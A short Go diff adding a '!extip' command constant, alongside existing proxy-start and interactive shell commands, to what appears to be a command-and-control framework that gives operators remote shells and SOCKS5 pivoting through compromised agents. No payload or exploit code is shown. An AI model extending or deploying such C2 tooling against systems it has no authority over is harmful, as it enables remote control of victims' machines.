@@ -25,4 +25,5 @@ const (
 	// C2 relay stream (Proxy route) so the C2 can forward SOCKS5 traffic to it.
 	C2CmdProxyStart = "!proxy_start"
 	C2CmdShell      = "!shell" // interactive PTY shell session (web virtual terminal)
+	C2CmdExtIP      = "!extip" // self-detect agent public egress IP (web panel retest button)
 )
